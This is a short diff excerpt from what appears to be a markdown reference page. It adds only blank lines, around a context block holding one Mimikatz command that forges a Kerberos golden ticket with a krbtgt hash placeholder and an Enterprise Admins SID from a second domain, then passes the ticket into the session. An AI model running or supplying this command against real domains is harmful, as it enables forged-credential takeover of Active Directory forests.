@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:26:22.637180+00:00'
 ```powershell
 kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt
 ```
+
+
